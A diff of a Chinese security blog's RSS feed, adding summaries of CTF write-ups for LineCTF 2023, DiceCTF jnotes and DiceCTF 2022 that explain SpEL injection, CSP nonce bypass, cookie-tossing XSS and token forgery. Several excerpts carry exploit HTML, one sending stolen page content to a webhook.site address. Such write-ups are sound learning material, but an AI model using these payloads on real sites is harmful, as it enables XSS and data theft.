@@ -21,6 +21,26 @@ const url = &amp;#34;http://localhost:3000/login&amp;#34;; const requestBody = &
     </item>
     
     <item>
+      <title>Linectf2023 复现</title>
+      <link>http://blog.an4er.top/post/linectf/</link>
+      <pubDate>Tue, 11 Apr 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://blog.an4er.top/post/linectf/</guid>
+      <description>SafeNote 查看路由，发现在admin的controller下存在/feature路由可以执行spel表达式
+那么问题来到怎么去获得admin的权限，在spel路由的上面有一个
+如果从请求头中获得的Authorization解码后不为USER即可返回JWT key，尝试删除Authorization，访问，但是被filter给拦住，查看config，有如下匹配
+符合路径的会在请求到达路由前检查请求头。所以我们需要绕过这个正则，使用%0a可以截断绕过
+然后利用这key去签名即可
+Another Secure Store Note 查看附件发现flag放在bot的localStorage中，然后登录后的用户名中存在XSS，但是被CSP限制了
+我们需要有nonce才能执行XSS，因为nonce是随机生成的，然后访问/profile时会访问/csp.gif刷新nonce，为防止nonce刷新，第一个想到的是去修改它的base uri ，又因为base-uri 是 self，所以使用base设置随意的路径来阻断
+&amp;lt;base href=&amp;#39;https://35.200.57.143:11004/a/&amp;#39;&amp;gt; 然后查看前端，为了执行getSettings.js，使用如下一条语句
+我们需要的nonce明文储存在前端，尝试使用Dangling Markup来外带代码，但是更改用户名需要_csrf，所以我们需要最后一步偷到_csrf来串起来。在getSettings.js文件中会为前端填入csrf，所以我们只要执行getSettings.js便能得到对应的_csrf然后直接发送给/porfile即可改名
+因为Worker 线程所在的全局对象，与主线程不一样，无法读取主线程所在网页的 DOM 对象，也无法使用document、window、parent这些对象。
+所以在isInWindowContext()中，该函数的实现方式依赖于 self 在当前执行环境中指向的对象与全局作用域中的 self 对象不同这一事实，因此可以通过改变 self 的值来判断当前执行环境是否为浏览器窗口上下文。断绝了使用web worker的使用。这里huli师傅用的Object.defineProperty去直接覆盖document.domain的值，得改名的poc：
+&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt; &amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;script&amp;gt; Object.defineProperty(document, &amp;#39;domain&amp;#39;, { value: &amp;#39;35.200.57.143&amp;#39; }) &amp;lt;/script&amp;gt; &amp;lt;input id=&amp;#34;_csrf&amp;#34; /&amp;gt; &amp;lt;script src=&amp;#34;https://35.200.57.143:11004/getSettings.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;form id=f method=POST action=&amp;#34;https://35.200.57.143:11004/profile&amp;#34; target=&amp;#34;_blank&amp;#34;&amp;gt; &amp;lt;input name=&amp;#34;name&amp;#34; value=&amp;#34;poc&amp;#34;&amp;gt; &amp;lt;input name=&amp;#34;csrf&amp;#34; value=&amp;#34;&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; const csrf = _csrf.</description>
+    </item>
+    
+    <item>
       <title>hxpCTF valentine WP</title>
       <link>http://blog.an4er.top/post/hxp_valentine/</link>
       <pubDate>Wed, 22 Mar 2023 00:00:00 +0000</pubDate>
@@ -47,6 +67,20 @@ var _OPTS_PASSABLE_WITH_DATA = [&amp;#39;delimiter&amp;#39;, &amp;#39;scope&amp;
 因为note也是httpOnly的，所以也无法使用js去设置它的值，这里利用document.cookie=&#39;=note=&amp;quot;;path=//&#39;;创建键为空，值为note的cookie，发送时也就是 note=&amp;quot;....这里为了让note在最前面以可以覆盖掉后面的值所以让path的路径较长与FLAG
 Cookies with longer path are listed before cookies with shorter path. Cookies which are edited least recently are listed before cookies which are edited most recently. 引用及payload来自https://github.com/RohitNarayananM/blog/tree/main/dicectf23-writeups/jnotes
 &amp;lt;html&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form method=&amp;#34;POST&amp;#34; action=&amp;#34;https://jnotes.mc.ax/create&amp;#34;&amp;gt; &amp;lt;input id=&amp;#34;p&amp;#34; name=&amp;#34;note&amp;#34; value=&amp;#34;&amp;#34; &amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; document.querySelector(&amp;#34;#p&amp;#34;).value = `&amp;lt;/textarea&amp;gt; &amp;lt;\x73cript&amp;gt; document.cookie=&amp;#39;=note=&amp;#34;;path=//&amp;#39;; const frame = document.createElement(&amp;#39;iframe&amp;#39;); frame.src = &amp;#34;https://jnotes.mc.ax//&amp;#34;; document.body.appendChild(frame); frame.onload = () =&amp;gt; { navigator.sendBeacon(&amp;#34;https://webhook.site/5dd13816-1676-4a89-86d8-f98dab51e720&amp;#34;,frame.contentWindow.document.body.innerHTML); } &amp;lt;/\x73cript&amp;gt;`; document.forms[0].submit(); &amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; offical https://blog.</description>
+    </item>
+    
+    <item>
+      <title>diceCTF2022 复现</title>
+      <link>http://blog.an4er.top/post/dicectf2022/</link>
+      <pubDate>Tue, 31 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://blog.an4er.top/post/dicectf2022/</guid>
+      <description>knock-knock 题目的主要逻辑是：创建一个note会返回这个note在数组中的下标id然后和对应的访问token，然后flag在程序启动的时候就push到了数组中，其下标也就是id应该为0。所以我们为了获取到flag，只要获取到对应的token即可，其中的token是如此生成的
+class Database {constructor() {this.notes = [];this.secret = `secret-${crypto.randomUUID}`;}generateToken(id) {return crypto.createHmac(&amp;#39;sha256&amp;#39;, this.secret).update(id.toString()).digest(&amp;#39;hex&amp;#39;);}} 所以因为我们的目的是要伪造token，所以我们需要知道它的secret，这里的secret使用模板语法，取了crypto的randomUUID值，因为没有用（）调用函数，所以返回的是函数体，也就是固定内容
+blazingfast 简单读一下bot.js发现目的是要XSS，然后查看index.html中执行的js
+WebAssembly.instantiateStreaming(fetch(&amp;#39;/blazingfast.wasm&amp;#39;)).then(({ instance }) =&amp;gt; { blazingfast = instance.exports; document.getElementById(&amp;#39;demo-submit&amp;#39;).onclick = () =&amp;gt; { demo(document.getElementById(&amp;#39;demo&amp;#39;).value); } let query = new URLSearchParams(window.location.search).get(&amp;#39;demo&amp;#39;); if (query) { document.getElementById(&amp;#39;demo&amp;#39;).value = query; demo(query); } }) 这里使用js的api去调用WebAssembly
+WebAssembly 是一种新的编码方式，可以在现代的网络浏览器中运行 － 它是一种低级的类汇编语言，具有紧凑的二进制格式，可以接近原生的性能运行，并为诸如 C / C ++等语言提供一个编译目标，以便它们可以在 Web 上运行。它也被设计为可以与 JavaScript 共存，允许两者一起工作。
+WebAssembly 被设计为可以和 JavaScript 一起协同工作——通过使用 WebAssembly 的 JavaScript API，你可以把 WebAssembly 模块加载到一个 JavaScript 应用中并且在两者之间共享功能。这允许你在同一个应用中利用 WebAssembly 的性能和威力以及 JavaScript 的表达力和灵活性，即使你可能并不知道如何编写 WebAssembly 代码。</description>
     </item>
     
     <item>
